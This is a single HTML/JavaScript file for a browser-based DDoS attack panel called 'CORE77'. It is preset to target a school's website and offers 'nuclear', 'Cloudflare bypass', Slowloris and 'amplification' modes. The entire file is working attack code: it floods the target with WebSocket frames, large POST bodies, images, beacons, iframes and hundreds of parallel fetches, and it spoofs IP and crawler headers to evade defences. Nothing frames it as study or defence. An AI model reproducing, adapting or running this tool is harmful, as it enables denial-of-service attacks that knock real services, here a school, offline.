<!DOCTYPE html>
<html>
<head>
    <title>‚ò¢Ô∏è CORE77 - NUCLEAR DDoS PANEL (DIRECT IMPACT)</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #000; 
            color: #f00; 
            font-family: monospace; 
            overflow: hidden; 
            cursor: crosshair; 
        }
        .blink { animation: blink 0.5s infinite; }
        @keyframes blink { 50% { opacity: 0.3; } }
        .container { padding: 10px; }
        .nuke-btn { 
            background: linear-gradient(45deg, #f00, #900);
            color: #fff; 
            border: none; 
            padding: 20px; 
            font-size: 2em; 
            margin: 10px; 
            cursor: pointer; 
            width: 100%; 
            text-transform: uppercase; 
            letter-spacing: 5px; 
        }
        .nuke-btn:hover { background: linear-gradient(45deg, #f44, #c00); }
        .terminal { 
            background: #111; 
            height: 300px; 
            overflow-y: auto; 
            border: 2px solid #f00; 
            padding: 10px; 
            margin: 10px 0; 
        }
        .stats { 
            display: flex; 
            justify-content: space-between; 
            padding: 10px; 
            background: #222; 
            border: 1px solid #f00; 
            margin: 5px 0; 
        }
        input, select { 
            background: #000; 
            color: #0f0; 
            border: 1px solid #f00; 
            padding: 10px; 
            margin: 5px; 
            width: 100%; 
        }
        .target-display { 
            font-size: 1.5em; 
            color: #0f0; 
            text-align: center; 
            padding: 10px; 
            border: 2px dashed #f00; 
            margin: 10px 0; 
        }
    </style>
</head>
<body onload="init()">
    <div class="container">
        <h1 class="blink">‚ò¢Ô∏è CORE77 - NUCLEAR DDoS PANEL (DIRECT IMPACT)</h1>
        <div class="target-display" id="targetDisplay">TARGET: https://www.smkn3tgt.sch.id</div>
        
        <input type="text" id="targetUrl" value="https://www.smkn3tgt.sch.id" placeholder="ENTER TARGET URL">
        
        <div class="stats">
            <div>REQUESTS: <span id="reqCount">0</span></div>
            <div>RPS: <span id="rps">0</span></div>
            <div>SUCCESS: <span id="success">0%</span></div>
            <div>THREADS: <span id="threads">0</span></div>
        </div>
        
        <select id="attackType">
            <option value="nuclear">‚ò¢Ô∏è NUCLEAR MODE (MAX DESTRUCTION)</option>
            <option value="bypass">üõ°Ô∏è CLOUDFLARE BYPASS</option>
            <option value="slow">üêå SLOWLORIS ULTRA</option>
            <option value="amplify">üì° AMPLIFICATION ATTACK</option>
        </select>
        
        <button class="nuke-btn" onclick="launchNuclear()" id="launchBtn">üöÄ LAUNCH NUCLEAR ATTACK</button>
        <button class="nuke-btn" onclick="stopNuclear()" id="stopBtn" disabled>üõë EMERGENCY STOP</button>
        
        <div class="terminal" id="terminal">
            [SYSTEM] READY FOR NUCLEAR ATTACK<br>
            [WARNING] THIS WILL CAUSE DIRECT IMPACT<br>
            [TARGET] SET: https://www.smkn3tgt.sch.id
        </div>
    </div>

    <script>
        // Brutal attack variables
        let attackActive = false;
        let requestCount = 0;
        let successCount = 0;
        let attackThreads = [];
        let rpsHistory = [];
        let startTime = 0;
        
        // Direct impact methods (lebih brutal)
        const nuclearMethods = {
            // Method 1: WebSocket Flood (paling ganas)
            wsFlood: function(url) {
                try {
                    const wsUrl = url.replace('https://', 'wss://').replace('http://', 'ws://');
                    const ws = new WebSocket(wsUrl + '/ws');
                    ws.onopen = () => {
                        // Kirim data terus menerus
                        const interval = setInterval(() => {
                            if (!attackActive) {
                                clearInterval(interval);
                                ws.close();
                                return;
                            }
                            ws.send('x'.repeat(10000)); // 10KB per frame
                            recordRequest(true);
                        }, 100);
                    };
                    ws.onerror = () => recordRequest(false);
                } catch(e) {}
            },
            
            // Method 2: Fetch dengan payload besar
            fetchBomb: async function(url) {
                const controller = new AbortController();
                try {
                    await fetch(url + '?nuke=' + Date.now(), {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-Forwarded-For': randomIP(),
                            'User-Agent': randomUA()
                        },
                        body: JSON.stringify({data: 'x'.repeat(50000)}), // 50KB payload
                        mode: 'no-cors',
                        signal: controller.signal
                    });
                    recordRequest(true);
                } catch(e) {
                    recordRequest(false);
                }
            },
            
            // Method 3: Image flood dengan resolusi besar
            imgBomb: function(url) {
                for(let i = 0; i < 5; i++) {
                    const img = new Image();
                    img.src = url + '?img=' + Date.now() + '&size=5000x5000&quality=100&' + Math.random();
                    img.onload = img.onerror = () => recordRequest(true);
                }
            },
            
            // Method 4: XMLHttpRequest dengan timeout panjang
            xhrSlow: function(url) {
                const xhr = new XMLHttpRequest();
                xhr.open('GET', url + '?slow=' + Date.now());
                xhr.timeout = 30000; // 30 second timeout
                xhr.onload = xhr.onerror = xhr.ontimeout = () => recordRequest(true);
                
                // Tambah header banyak2
                for(let i = 0; i < 20; i++) {
                    xhr.setRequestHeader('X-Custom-' + i, 'x'.repeat(1000));
                }
                xhr.send();
            },
            
            // Method 5: Beacon API spam
            beaconSpam: function(url) {
                for(let i = 0; i < 10; i++) {
                    navigator.sendBeacon(url + '?beacon=' + Date.now(), 'data=' + 'x'.repeat(10000));
                }
                recordRequest(true);
            },
            
            // Method 6: Iframe bomb
            iframeBomb: function(url) {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = url + '?iframe=' + Date.now();
                document.body.appendChild(iframe);
                setTimeout(() => document.body.removeChild(iframe), 10000);
                recordRequest(true);
            }
        };
        
        // Helper functions
        function randomIP() {
            return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
        }
        
        function randomUA() {
            const uas = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
                'Googlebot/2.1 (+http://www.google.com/bot.html)',
                'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'
            ];
            return uas[Math.floor(Math.random() * uas.length)];
        }
        
        function recordRequest(success) {
            requestCount++;
            if(success) successCount++;
            
            const now = Date.now();
            rpsHistory = rpsHistory.filter(time => now - time < 1000);
            rpsHistory.push(now);
            
            updateDisplay();
        }
        
        function updateDisplay() {
            document.getElementById('reqCount').textContent = requestCount.toLocaleString();
            document.getElementById('rps').textContent = rpsHistory.length;
            document.getElementById('success').textContent = requestCount > 0 ? 
                Math.round((successCount / requestCount) * 100) + '%' : '0%';
            document.getElementById('threads').textContent = attackThreads.length;
        }
        
        function log(msg) {
            const terminal = document.getElementById('terminal');
            terminal.innerHTML += '<br>[' + new Date().toLocaleTimeString() + '] ' + msg;
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        function launchNuclear() {
            const url = document.getElementById('targetUrl').value;
            const attackType = document.getElementById('attackType').value;
            
            if(!url) {
                alert('ENTER TARGET URL FIRST!');
                return;
            }
            
            // Reset
            attackActive = true;
            requestCount = 0;
            successCount = 0;
            attackThreads = [];
            rpsHistory = [];
            startTime = Date.now();
            
            // Update UI
            document.getElementById('launchBtn').disabled = true;
            document.getElementById('stopBtn').disabled = false;
            document.getElementById('targetDisplay').textContent = 'ATTACKING: ' + url;
            document.getElementById('targetDisplay').style.color = '#f00';
            
            log('üöÄ NUCLEAR ATTACK LAUNCHED!');
            log('‚ò¢Ô∏è TARGET: ' + url);
            log('üíÄ ATTACK TYPE: ' + attackType);
            log('‚ö†Ô∏è MAXIMUM DESTRUCTION INITIATED');
            
            // Launch based on attack type
            switch(attackType) {
                case 'nuclear':
                    launchFullNuclear(url);
                    break;
                case 'bypass':
                    launchBypassAttack(url);
                    break;
                case 'slow':
                    launchSlowlorisUltra(url);
                    break;
                case 'amplify':
                    launchAmplification(url);
                    break;
            }
            
            // Auto-update stats
            const statsInterval = setInterval(updateDisplay, 1000);
            attackThreads.push(statsInterval);
        }
        
        function launchFullNuclear(url) {
            log('üí£ LAUNCHING FULL NUCLEAR STRIKE');
            
            // WebSocket Flood (100 threads)
            for(let i = 0; i < 100; i++) {
                const interval = setInterval(() => {
                    if(!attackActive) {
                        clearInterval(interval);
                        return;
                    }
                    nuclearMethods.wsFlood(url);
                }, 500);
                attackThreads.push(interval);
            }
            
            // Fetch Bomb (50 threads)
            for(let i = 0; i < 50; i++) {
                const interval = setInterval(() => {
                    if(!attackActive) return;
                    nuclearMethods.fetchBomb(url);
                }, 1000);
                attackThreads.push(interval);
            }
            
            // Image Bomb (30 threads)
            for(let i = 0; i < 30; i++) {
                const interval = setInterval(() => {
                    if(!attackActive) return;
                    nuclearMethods.imgBomb(url);
                }, 500);
                attackThreads.push(interval);
            }
            
            // XHR Slow (20 threads)
            for(let i = 0; i < 20; i++) {
                const interval = setInterval(() => {
                    if(!attackActive) return;
                    nuclearMethods.xhrSlow(url);
                }, 2000);
                attackThreads.push(interval);
            }
            
            // Beacon Spam (10 threads)
            for(let i = 0; i < 10; i++) {
                const interval = setInterval(() => {
                    if(!attackActive) return;
                    nuclearMethods.beaconSpam(url);
                }, 500);
                attackThreads.push(interval);
            }
            
            // Iframe Bomb (5 threads)
            for(let i = 0; i < 5; i++) {
                const interval = setInterval(() => {
                    if(!attackActive) return;
                    nuclearMethods.iframeBomb(url);
                }, 3000);
                attackThreads.push(interval);
            }
            
            log('‚ò¢Ô∏è NUCLEAR STRIKE ACTIVE: ' + attackThreads.length + ' THREADS RUNNING');
        }
        
        function launchBypassAttack(url) {
            log('üõ°Ô∏è CLOUDFLARE BYPASS ATTACK INITIATED');
            
            // Rotating IPs and User Agents
            for(let i = 0; i < 200; i++) {
                const interval = setInterval(() => {
                    if(!attackActive) return;
                    
                    // Multiple request methods per interval
                    fetch(url + '?cache=' + Date.now() + Math.random(), {
                        headers: {
                            'User-Agent': randomUA(),
                            'X-Forwarded-For': randomIP(),
                            'CF-Connecting-IP': randomIP(),
                            'X-Real-IP': randomIP(),
                            'Referer': 'https://www.google.com/',
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache'
                        },
                        mode: 'no-cors'
                    }).catch(() => {});
                    
                    recordRequest(true);
                }, 50);
                attackThreads.push(interval);
            }
        }
        
        function launchSlowlorisUltra(url) {
            log('üêå SLOWLORIS ULTRA ATTACK STARTED');
            
            // Create many partial connections
            for(let i = 0; i < 1000; i++) {
                setTimeout(() => {
                    if(!attackActive) return;
                    
                    const xhr = new XMLHttpRequest();
                    xhr.open('GET', url);
                    xhr.setRequestHeader('X-a', 'b');
                    xhr.send(null);
                    
                    // Keep alive with partial headers
                    let counter = 0;
                    const keepAlive = setInterval(() => {
                        if(!attackActive || counter++ > 30) {
                            clearInterval(keepAlive);
                            return;
                        }
                        try {
                            xhr.send('X-' + counter + ': ' + 'x'.repeat(100) + '\r\n');
                        } catch(e) {}
                    }, 1000);
                    
                    attackThreads.push(keepAlive);
                }, i * 10); // Stagger connections
            }
        }
        
        function launchAmplification(url) {
            log('üì° AMPLIFICATION ATTACK SIMULATION');
            
            // Simulate amplification by multiple parallel requests
            for(let i = 0; i < 500; i++) {
                const interval = setInterval(() => {
                    if(!attackActive) return;
                    
                    // Launch 10 parallel requests per thread
                    for(let j = 0; j < 10; j++) {
                        fetch(url + '?amp=' + Date.now() + j, {
                            mode: 'no-cors'
                        }).catch(() => {});
                        recordRequest(true);
                    }
                }, 100);
                attackThreads.push(interval);
            }
        }
        
        function stopNuclear() {
            attackActive = false;
            
            // Clear all intervals
            attackThreads.forEach(interval => clearInterval(interval));
            attackThreads = [];
            
            // Update UI
            document.getElementById('launchBtn').disabled = false;
            document.getElementById('stopBtn').disabled = true;
            document.getElementById('targetDisplay').style.color = '#0f0';
            
            const duration = Math.round((Date.now() - startTime) / 1000);
            log('üõë ATTACK STOPPED AFTER ' + duration + ' SECONDS');
            log('üìä TOTAL REQUESTS: ' + requestCount.toLocaleString());
            log('üéØ SUCCESS RATE: ' + (requestCount > 0 ? 
                Math.round((successCount / requestCount) * 100) + '%' : '0%'));
            
            updateDisplay();
        }
        
        function init() {
            log('[SYSTEM] NUCLEAR DDoS PANEL READY');
            log('[WARNING] THIS TOOL CAUSES DIRECT IMPACT');
            log('[INFO] Set target URL and select attack type');
        }
    </script>
</body>
</html>
